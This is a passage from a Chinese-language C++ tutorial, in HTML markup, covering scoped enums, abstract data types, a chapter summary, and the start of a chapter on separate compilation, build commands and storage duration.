class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 enum class 定义作用域内枚举</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span> :</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> &#123; <span class="comment">// 指定底层类型为 unsigned char</span></span><br><span class="line">    RED,    <span class="comment">// Color::RED</span></span><br><span class="line">    GREEN,  <span class="comment">// Color::GREEN</span></span><br><span class="line">    BLUE    <span class="comment">// Color::BLUE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">TrafficLight</span> &#123;</span></span><br><span class="line">    RED,    <span class="comment">// TrafficLight::RED (与 Color::RED 不冲突)</span></span><br><span class="line">    YELLOW,</span><br><span class="line">    GREEN</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = Color::RED; <span class="comment">// 必须使用作用域解析符</span></span><br><span class="line">    TrafficLight light = TrafficLight::GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！枚举量不在当前作用域</span></span><br><span class="line">    <span class="comment">// Color anotherColor = RED;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能隐式转换为 int</span></span><br><span class="line">    <span class="comment">// int colorCode = myColor;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(myColor);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> underlyingValue = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">char</span>&gt;(myColor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Underlying value: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(underlyingValue) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 (需要再次转换才能打印为数字)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不同枚举类型不能直接比较</span></span><br><span class="line">    <span class="comment">// if (myColor == light) &#123; /* ... */ &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以与相同类型的枚举量比较</span></span><br><span class="line">    <span class="keyword">if</span> (myColor == Color::RED) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (light == TrafficLight::GREEN) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The light is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作用域内枚举是现代 C++ 中定义枚举类型的首选方式，因为它更安全、更不容易出错，并且避免了名称污染。</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ul><li>  类成员（数据、函数、类型、常量、枚举）具有<strong>类作用域</strong>。</li><li>  在类外部访问类成员需要通过对象（<code>.</code> 或 <code>-&gt;</code>）或类名（<code>::</code>）。</li><li>  类作用域可以隔离名称，防止与全局或其他类中的名称冲突。</li><li>  可以使用 <code>static const</code> (整型/枚举) 或 <code>static constexpr</code> (C++11, 推荐) 在类内部定义常量。</li><li>  C++11 引入了**作用域内枚举 (<code>enum class</code> 或 <code>enum struct</code>)**，其枚举量作用域限制在枚举内，且不能隐式转换为整型，提高了代码的安全性和清晰度。</li></ul><h2 id="10-7-抽象数据类型"><a href="#10-7-抽象数据类型" class="headerlink" title="10.7 抽象数据类型"></a>10.7 抽象数据类型</h2><p>我们在本章中学习的类是 C++ 实现<strong>抽象数据类型 (Abstract Data Type, ADT)</strong> 的一种方式。ADT 是一种计算机科学的概念，它是一种<strong>数学模型</strong>，用于描述具有特定行为（语义）的数据类型，重点在于<strong>可以对数据执行的操作</strong>，而不是这些操作的具体实现方式或数据的内部表示。</p><p><strong>ADT 的核心思想:</strong></p><ol><li> <strong>数据封装:</strong> ADT 将数据以及对这些数据进行操作的函数捆绑在一起。</li><li> <strong>接口与实现分离:</strong> ADT 定义了一个<strong>公共接口 (Interface)**，即一组可以对数据执行的操作。用户通过这个接口与数据交互，而不需要知道数据是如何存储的，或者操作是如何实现的（</strong>实现细节隐藏**）。</li></ol><p>可以把 ADT 想象成一个“黑盒子”。你知道你可以给这个盒子提供什么输入（通过接口调用操作），以及你会得到什么输出或结果，但你不需要（也不能）看到盒子内部的构造。</p><p><strong>与内置类型的类比:</strong></p><p>想想 C++ 的内置类型 <code>int</code>。</p><ul><li>  <strong>数据:</strong> 它可以表示整数。</li><li>  <strong>操作:</strong> 你可以对 <code>int</code> 执行加、减、乘、除、比较等操作。</li><li>  <strong>抽象:</strong> 你使用这些操作时，并不需要关心 <code>int</code> 在内存中是如何用二进制位表示的，或者加法操作在 CPU 层面是如何执行的。你只关心操作的<strong>效果</strong>。</li></ul><p>ADT 将这种思想扩展到了用户自定义的数据类型。</p><p><strong>C++ 类如何实现 ADT:</strong></p><p>C++ 类天然地支持 ADT 的概念：</p><ul><li>  <strong>数据表示:</strong> 类的数据成员（通常是 <code>private</code>）用于存储 ADT 的数据。</li><li>  <strong>操作接口:</strong> 类的公有成员函数（<code>public</code> methods）定义了 ADT 的公共接口，即允许外部代码执行的操作。</li><li>  <strong>实现隐藏:</strong> 将数据成员设为 <code>private</code>，并将实现细节（如私有辅助函数、成员函数的具体代码）与接口（类定义中的公有声明）分离，实现了数据隐藏和封装。</li></ul><p><strong>以 <code>Stock</code> 类为例:</strong></p><p>我们可以将 <code>Stock</code> 类视为一个“股票持有” ADT。</p><ul><li>  <strong>ADT 描述:</strong> 一个表示某公司股票持有情况的类型。</li><li>  <strong>数据 (概念上):</strong> 公司名称、持有股数、当前股价、总价值。</li><li><strong>操作 (接口):</strong><ul><li>  创建一个股票持有记录（构造函数）。</li><li>  买入指定数量的股票（<code>buy</code> 方法）。</li><li>  卖出指定数量的股票（<code>sell</code> 方法）。</li><li>  更新股票价格（<code>update</code> 方法）。</li><li>  显示股票持有信息（<code>show</code> 方法）。</li><li>  (可能还有) 获取总价值、获取公司名称等。</li></ul></li><li><strong>实现 (隐藏细节):</strong><ul><li>  数据成员 <code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code> 的具体类型（<code>std::string</code>, <code>long</code>, <code>double</code>）。</li><li>  私有辅助函数 <code>set_tot()</code> 的存在及其实现。</li><li>  <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code> 等函数的具体代码逻辑。</li></ul></li></ul><p>使用 <code>Stock</code> 类的程序员（客户端代码）只需要了解其公共接口（<code>public</code> 方法）。他们可以创建 <code>Stock</code> 对象，调用 <code>buy()</code>, <code>sell()</code>, <code>show()</code> 等方法来完成任务，而无需关心 <code>total_val</code> 是如何计算和更新的，或者 <code>company</code> 是用 <code>std::string</code> 还是 C 风格字符串存储的。如果类的设计者决定改变内部实现（例如，优化 <code>set_tot</code> 的计算），只要公共接口保持不变，客户端代码就无需修改。</p><p><strong>ADT 的好处:</strong></p><ul><li>  <strong>抽象:</strong> 简化复杂性，让用户关注“做什么”而非“怎么做”。</li><li>  <strong>封装:</strong> 保护数据不被意外破坏，隐藏实现细节。</li><li>  <strong>模块化:</strong> 将程序分解为独立的、功能明确的单元（类/ADT）。</li><li>  <strong>可维护性:</strong> 修改一个 ADT 的内部实现不会影响使用该 ADT 的其他代码（只要接口不变）。</li><li>  <strong>可重用性:</strong> 设计良好的 ADT 可以在不同的程序中重复使用。</li></ul><p>因此，在设计 C++ 类时，以 ADT 的思维方式进行思考——明确这个类代表什么概念，它应该提供哪些操作（公共接口），以及需要隐藏哪些内部细节——是非常有益的。这有助于创建出结构清晰、易于使用和维护的代码。</p><h2 id="10-8-总结"><a href="#10-8-总结" class="headerlink" title="10.8 总结"></a>10.8 总结</h2><p>本章介绍了面向对象编程（OOP）的核心概念，并深入探讨了 C++ 实现 OOP 的主要机制——**类 (Class)**。类是用户定义类型的基础，它允许我们将数据和操作数据的函数封装在一起。</p><p>主要内容回顾：</p><ol><li><p> <strong>过程性编程 vs. 面向对象编程:</strong> 过程性编程关注执行步骤和函数，而面向对象编程关注数据及其相关操作，将它们封装在<strong>对象 (Object)</strong> 中。OOP 的核心思想包括封装、抽象、继承和多态。</p></li><li><p><strong>抽象和类:</strong></p><ul><li>  <strong>抽象</strong>是关注本质特征、忽略实现细节的过程。</li><li>  <strong>类</strong>是创建对象的蓝图，定义了对象的<strong>数据成员（属性）</strong>和<strong>成员函数（方法）</strong>。</li><li>  <strong>访问说明符</strong>（<code>public</code>, <code>private</code>, <code>protected</code>）控制对类成员的访问。<code>public</code> 成员构成类的<strong>公共接口</strong>，而 <code>private</code> 成员（通常是数据）实现了<strong>数据隐藏</strong>，是<strong>封装</strong>的关键。</li><li>  类的成员函数通常在类定义中声明，在单独的源文件中使用<strong>作用域解析运算符 <code>::</code></strong> 定义。</li><li>  通过类的对象使用**点号 <code>.</code>**（或指针使用箭头 <code>-&gt;</code>）访问其公有成员。</li></ul></li><li><p><strong>构造函数和析构函数:</strong></p><ul><li>  <strong>构造函数</strong>是与类同名的特殊成员函数，在创建对象时自动调用，用于初始化对象。它可以被重载。如果用户未定义任何构造函数，编译器会生成一个默认构造函数（无参）。如果用户定义了任何构造函数，编译器就不再生成默认构造函数。</li><li>  <strong>析构函数</strong>是类名前加 <code>~</code> 的特殊成员函数，在对象生命周期结束时自动调用，用于执行清理工作（如释放 <code>new</code> 分配的内存）。它没有参数，不能重载。</li></ul></li><li><p><strong><code>this</code> 指针:</strong></p><ul><li>  每个非静态成员函数都有一个隐含的 <code>this</code> 指针，指向调用该函数的对象。</li><li>  通常隐式使用，但在需要区分同名参数和成员、或需要返回对象自身引用/指针（如链式调用）时显式使用 <code>this</code> 或 <code>*this</code>。</li></ul></li><li><p><strong>对象数组:</strong></p><ul><li>  可以创建类对象的数组。</li><li>  创建数组时，会为每个元素调用构造函数（通常是默认构造函数，除非使用初始化列表）。</li><li>  访问方式为 <code>arrayName[index].member</code>。</li><li>  动态对象数组使用 <code>new ClassName[size]</code> 创建，需要默认构造函数，并用 <code>delete [] ptr</code> 释放。</li></ul></li><li><p><strong>类作用域:</strong></p><ul><li>  类成员（数据、函数、类型、常量、枚举）具有类作用域，在类外部访问需要限定。</li><li>  可以使用 <code>static const</code> 或 <code>static constexpr</code> (C++11 推荐) 定义类范围内的常量。</li><li>  C++11 引入了**作用域内枚举 (<code>enum class</code>)**，提高了枚举的类型安全性和作用域控制。</li></ul></li><li><p><strong>抽象数据类型 (ADT):</strong></p><ul><li>  ADT 是一个侧重于操作接口而非内部实现的数学模型。</li><li>  C++ 类是实现 ADT 的强大工具，通过公共接口提供操作，通过私有成员隐藏实现细节，体现了封装和抽象的原则。</li></ul></li></ol><p>通过使用类，我们可以创建模块化、可重用、易于维护的复杂程序，更好地模拟现实世界的问题。掌握类的设计和使用是精通 C++ 的关键一步。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 9 内存模型和名称空间</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_9/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_9/</url>
      
        <content type="html"><![CDATA[<h2 id="9-1-单独编译"><a href="#9-1-单独编译" class="headerlink" title="9.1 单独编译"></a>9.1 单独编译</h2><p>随着程序变得越来越大，将所有代码都放在一个巨大的 <code>main.cpp</code> 文件中会变得难以管理和维护。C++ 支持**单独编译 (Separate Compilation)**，允许我们将程序分解成多个独立的源文件（通常是 <code>.cpp</code> 文件）和头文件（通常是 <code>.h</code> 或 <code>.hpp</code> 文件）。</p><p><strong>这样做的好处:</strong></p><ol><li> <strong>组织性:</strong> 将相关的函数、类等放在不同的文件中，使项目结构更清晰。</li><li> <strong>可重用性:</strong> 可以将通用的功能（如工具函数、类定义）放在单独的文件中，方便在其他项目中重用。</li><li> <strong>模块化:</strong> 每个文件可以专注于特定的功能模块。</li><li> <strong>编译效率:</strong> 当修改某个 <code>.cpp</code> 文件时，通常只需要重新编译该文件，然后与其他未改变的目标文件重新链接即可，无需重新编译整个项目，大大节省了编译时间。</li></ol><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>单独编译通常涉及两种主要的文件类型：</p><ol><li><p><strong>头文件 (<code>.h</code> 或 <code>.hpp</code>)</strong>:</p><ul><li>  <strong>目的:</strong> 包含**声明 (Declarations)**，告诉编译器某个函数、类或变量的“接口”是什么样的，但不包含具体的实现代码（除了模板和内联函数）。</li><li><strong>典型内容:</strong><ul><li>  函数原型（函数声明）</li><li>  类 (class) 定义</li><li>  结构 (struct) 定义</li><li>  枚举 (enum) 定义</li><li>  模板 (template) 定义</li><li>  内联函数 (inline) 定义</li><li>  <code>const</code> 常量定义</li><li>  <code>using</code> 声明或指令</li></ul></li><li>  <strong><code>#include</code> 指令:</strong> 源文件通过 <code>#include &quot;header_file.h&quot;</code> 指令将头文件的内容包含进来，以便编译器知道如何使用其中声明的函数或类。</li><li><strong>包含卫哨 (Include Guards):</strong> 为了防止同一个头文件被意外地多次包含到同一个源文件中（这可能导致重定义错误），头文件通常使用<strong>包含卫哨</strong>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYHEADER_H_ <span class="comment">// 如果 MYHEADER_H_ 还没有被定义过</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYHEADER_H_ <span class="comment">// 就定义 MYHEADER_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 头文件的实际内容放在这里...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYHEADER_H_</span></span></span><br></pre></td></tr></table></figure>  或者使用 C++ 特有的 <code>#pragma once</code> 指令（更简洁，但不是所有编译器都支持，尽管非常普遍）：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 头文件的实际内容放在这里...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>源文件 (<code>.cpp</code>)</strong>:</p><ul><li>  <strong>目的:</strong> 包含**定义 (Definitions)**，即函数或方法的具体实现代码，以及全局变量的定义和初始化。</li><li><strong>典型内容:</strong><ul><li>  函数体（实现）</li><li>  类成员函数的实现</li><li>  全局变量的定义和初始化</li><li>  <code>main</code> 函数（通常在一个单独的 <code>.cpp</code> 文件中）</li></ul></li><li>  <strong>编译:</strong> 每个 <code>.cpp</code> 文件通常会被编译器<strong>独立地</strong>编译成一个**目标文件 (Object File)**（通常是 <code>.obj</code> 或 <code>.o</code> 文件）。目标文件包含了该源文件对应的机器代码，但可能还包含对其他文件中定义的函数或变量的引用。</li></ul></li></ol><h3 id="编译和链接过程"><a href="#编译和链接过程" class="headerlink" title="编译和链接过程"></a>编译和链接过程</h3><p>在C++中，将源代码转换为可执行程序通常分为编译和链接两个主要阶段。让我们看看这些过程中涉及的具体命令：</p><h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><p>使用g++（GNU C++ 编译器）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 编译单个源文件</span></span><br><span class="line">g++ -c utils.cpp     <span class="comment"># 生成 utils.o 目标文件</span></span><br><span class="line">g++ -c main.cpp      <span class="comment"># 生成 main.o 目标文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加优化选项</span></span><br><span class="line">g++ -c -O2 utils.cpp <span class="comment"># 使用O2级别的优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加调试信息</span></span><br><span class="line">g++ -c -g utils.cpp  <span class="comment"># 包含调试信息</span></span><br></pre></td></tr></table></figure><p>使用MSVC（Microsoft Visual C++）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 编译单个源文件</span></span><br><span class="line">cl /c utils.cpp      <span class="comment"># 生成 utils.obj 目标文件</span></span><br><span class="line">cl /c main.cpp       <span class="comment"># 生成 main.obj 目标文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加优化选项</span></span><br><span class="line">cl /c /O2 utils.cpp  <span class="comment"># 使用O2级别的优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加调试信息</span></span><br><span class="line">cl /c /Zi utils.cpp  <span class="comment"># 包含调试信息</span></span><br></pre></td></tr></table></figure><h4 id="链接命令"><a href="#链接命令" class="headerlink" title="链接命令"></a>链接命令</h4><p>使用g++:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 链接目标文件生成可执行文件</span></span><br><span class="line">g++ main.o utils.o -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment">## 链接并指定库文件</span></span><br><span class="line">g++ main.o utils.o -lmath -o myprogram</span><br></pre></td></tr></table></figure><p>使用MSVC:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 链接目标文件生成可执行文件</span></span><br><span class="line">link main.obj utils.obj /OUT:myprogram.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">## 链接并指定库文件</span></span><br><span class="line">link main.obj utils.obj math.lib /OUT:myprogram.exe</span><br></pre></td></tr></table></figure><h4 id="一步完成编译和链接"><a href="#一步完成编译和链接" class="headerlink" title="一步完成编译和链接"></a>一步完成编译和链接</h4><p>通常，我们可以在一个命令中完成编译和链接:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 使用g++</span></span><br><span class="line">g++ main.cpp utils.cpp -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用MSVC</span></span><br><span class="line">cl main.cpp utils.cpp /Fe:myprogram.exe</span><br></pre></td></tr></table></figure><p>编译器会自动处理中间步骤，生成必要的目标文件，然后链接它们创建最终的可执行文件。</p><p>一个包含多个文件的 C++ 项目的典型构建过程如下：</p><ol><li><strong>编译 (Compilation):</strong> 编译器分别处理每个 <code>.cpp</code> 源文件。对于每个 <code>.cpp</code> 文件：<ul><li>  预处理器处理 <code>#include</code> 指令，将头文件的内容插入到源文件中。</li><li>  编译器将处理后的源代码翻译成机器码，生成一个目标文件 (<code>.obj</code> 或 <code>.o</code>)。</li></ul></li><li><strong>链接 (Linking):</strong> <strong>链接器 (Linker)</strong> 将所有由编译器生成的目标文件以及可能需要的库文件（包含预编译代码，如标准库）组合在一起。<ul><li>  链接器负责解析目标文件之间的交叉引用（例如，<code>main.cpp</code> 调用了在 <code>utils.cpp</code> 中定义的函数）。</li><li>  如果所有引用都能找到对应的定义，并且没有重定义等错误，链接器就会生成最终的可执行文件（如 <code>.exe</code> 文件）。</li></ul></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设我们创建一个简单的项目，包含一个计算功能的工具函数。</p><p><strong>1. 头文件 (<code>utils.h</code>)</strong></p><p>包含函数声明和包含卫哨。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UTILS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UTILS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// UTILS_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>2. 源文件 (<code>utils.cpp</code>)</strong></p><p>包含函数的具体实现。它需要包含自己的头文件以确保声明和定义匹配。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// 包含头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 主程序文件 (<code>main.cpp</code>)</strong></p><p>使用 <code>utils.h</code> 中声明的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// 包含头文件以使用 add 函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = add(x, y); <span class="comment">// 调用在 utils.cpp 中定义的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>构建过程:</strong></p><ol><li> <strong>编译 <code>utils.cpp</code>:</strong> <code>compiler utils.cpp -&gt; utils.obj</code></li><li> <strong>编译 <code>main.cpp</code>:</strong> <code>compiler main.cpp -&gt; main.obj</code></li><li> <strong>链接:</strong> <code>linker main.obj utils.obj -&gt; myprogram.exe</code> (或类似名称)</li></ol><p><strong>声明 vs. 定义:</strong></p><p>理解声明和定义的区别对于单独编译至关重要：</p><ul><li>  <strong>声明 (Declaration):</strong> 告诉编译器某个东西（函数、变量、类等）的存在及其接口（名称、类型、参数等）。一个声明可以出现多次（只要它们一致）。头文件主要包含声明。</li><li>  <strong>定义 (Definition):</strong> 提供了某个东西的具体实现或内存分配。对于非内联函数和非静态数据成员，<strong>一个定义在一个程序中只能出现一次</strong>（<strong>单一定义规则 - One Definition Rule, ODR</strong>）。源文件主要包含定义。</li></ul><p>头文件充当了不同源文件之间的“契约”，确保它们对共享的函数和类有共同的理解，而链接器则负责将这些部分最终组装在一起。</p><h2 id="9-2-存储持续性、作用域和链接性"><a href="#9-2-存储持续性、作用域和链接性" class="headerlink" title="9.2 存储持续性、作用域和链接性"></a>9.2 存储持续性、作用域和链接性</h2><p>C++ 使用多种方案来管理内存中的数据。了解这些方案对于理解变量和函数的生命周期、可见性以及它们如何在不同文件间共享至关重要。主要涉及三个核心概念：</p><ol><li> <strong>存储持续性 (Storage Duration):</strong> 决定了对象（变量）在内存中保留多长时间。</li><li> <strong>作用域 (Scope):</strong> 描述了标识符（变量名、函数名等）在程序代码中的可见范围。</li><li> <strong>链接性 (Linkage):</strong> 决定了在不同编译单元（<code>.cpp</code> 文件）中声明的同名标识符是否指向同一个实体。</li></ol><p>C++ 主要有以下几种存储持续性：</p><ul><li>  <strong>自动存储持续性 (Automatic Storage Duration):</strong> 对象在程序执行进入其定义所在的代码块时创建，在退出该代码块时销毁。通常在函数内部定义的变量（非 <code>static</code>）属于这种。内存通常在栈 (stack) 上分配。</li><li>  <strong>静态存储持续性 (Static Storage Duration):</strong> 对象在程序启动时创建（或首次使用前），在整个程序运行期间都存在，直到程序结束时才销毁。全局变量、文件作用域的 <code>static</code> 变量、函数内部的 <code>static</code> 变量都属于这种。</li><li>  <strong>线程存储持续性 (Thread Storage Duration) (C++11):</strong> 对象与特定线程的生命周期绑定。使用 <code>thread_local</code> 说明符声明。</li><li>  <strong>动态存储持续性 (Dynamic Storage Duration):</strong> 对象通过 <code>new</code> 运算符在程序的自由存储区（堆, heap）上显式创建，并通过 <code>delete</code> 运算符显式销毁。其生命周期由程序员控制。</li></ul><h3 id="9-2-1-作用域和链接"><a href="#9-2-1-作用域和链接" class="headerlink" title="9.2.1 作用域和链接"></a>9.2.1 作用域和链接</h3><p><strong>作用域 (Scope)</strong> 定义了标识符有效的代码区域。C++ 中的主要作用域包括：</p><ul><li>  <strong>块作用域 (Block Scope):</strong> 标识符在代码块（由 <code>&#123;&#125;</code> 包围）内可见，从声明点开始到代码块结束。函数内部的变量、循环变量等具有块作用域。</li><li>  <strong>函数作用域 (Function Scope):</strong> 仅用于 <code>goto</code> 语句的标签，标签在整个函数内部都可见。</li><li>  <strong>函数原型作用域 (Function Prototype Scope):</strong> 